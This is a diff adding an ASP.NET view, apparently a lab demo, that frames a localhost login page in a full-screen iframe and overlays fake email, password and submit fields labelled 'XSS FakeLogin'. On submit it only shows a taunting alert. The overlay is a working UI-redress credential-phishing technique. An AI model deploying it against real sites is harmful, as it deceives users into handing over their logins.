@@ -1,0 +1,75 @@
+﻿
+@{
+    Layout = null;
+}
+
+<!DOCTYPE html>
+
+<html>
+<head>
+    <meta name="viewport" content="width=device-width" />
+    <link href="/Content/bootstrap.css" rel="stylesheet">
+    <link href="/Content/site.css" rel="stylesheet">
+    <title>UiRedress</title>
+</head>
+<body style="margin:0;">
+    <!--UI Redress-->
+    <iframe id="loginSite" src="http://localhost:48514/Account/Login" style="position:fixed; top:0px; left:0px; bottom:0px; right:0px; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:0;"></iframe>
+
+
+    <script>
+        //XSS FakeLogin
+        var form = document.createElement("form");
+        form.setAttribute("method", "POST");
+        form.setAttribute("accept-charset", "utf-8");
+        form.setAttribute("onSubmit", "GetGot()");
+        form.setAttribute("id", "loginForm");
+        form.setAttribute("style", "width:1170px; margin:auto; height:0; padding-left:129.984px");
+
+        var email = document.createElement("input");
+        email.setAttribute("name", "EmailFake");
+        email.setAttribute("type", "text");
+        email.setAttribute("id", "EmailFake");
+        email.setAttribute("class", "form-control valid");
+        email.setAttribute("style", "position:fixed; margin-left:15px; top: 183px; display:block;");
+        email.setAttribute("data-val", "true");
+        email.setAttribute("data-val-email", "The E-Mail field is not a valid e-mail address.");
+        email.setAttribute("data-val-required", "The E-Mail field is required.");
+
+        var password = document.createElement("input");
+        password.setAttribute("name", "PasswordFake");
+        password.setAttribute("type", "password");
+        password.setAttribute("id", "PasswordFake");
+        password.setAttribute("class", "form-control valid");
+        password.setAttribute("style", "position:fixed; margin-left:15px; top: 232px; display:block;");
+        password.setAttribute("data-val", "true");
+        password.setAttribute("data-val-required", "The Password field is required.");
+
+        var submit = document.createElement("input");
+        submit.setAttribute("name", "fakeButton");
+        submit.setAttribute("id", "fakeButton");
+        submit.setAttribute("value", "Anmelden");
+        submit.setAttribute("type", "submit");
+        submit.setAttribute("class", "btn btn-default");
+        submit.setAttribute("style", "position:fixed; margin-left:15px; top: 323px; display:block;");
+
+        form.appendChild(email);
+        form.appendChild(document.createElement("br"));
+        form.appendChild(password);
+        form.appendChild(document.createElement("br"));
+        form.appendChild(document.createElement("br"));
+        form.appendChild(submit);
+
+        document.getElementsByTagName('body')[0].appendChild(form);
+
+        function GetGot()
+        {
+            document.getElementById('loginSite').style.height = 0;
+            window.alert("you got GOT!\nSometimes you get em and sometimes you get got.\nThis time you got got.");
+
+        }
+
+
+    </script>
+</body>
+</html>
